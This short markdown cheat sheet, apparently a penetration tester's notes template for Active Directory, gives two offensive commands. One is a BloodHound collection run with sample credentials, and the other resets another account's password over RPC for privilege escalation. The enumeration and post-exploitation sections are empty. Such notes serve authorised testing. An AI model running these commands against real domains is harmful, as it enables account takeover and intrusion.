### Information Gathering
- Bloodhound
```bash
bloodhound-python -u mchackudao -p Pass123!  -ns 10.10.10.10 -d domain.local -c All
```

### Enumeration
```bash
```

### Exploitation
- Transitive Control Privesc
```bash
net rpc password "OldPass123" "NewPass123" -U "domain.local"/"user"%"[REDACTED]" -S "dc.domain.local"
```

### Post-Exploitation
```bash

```
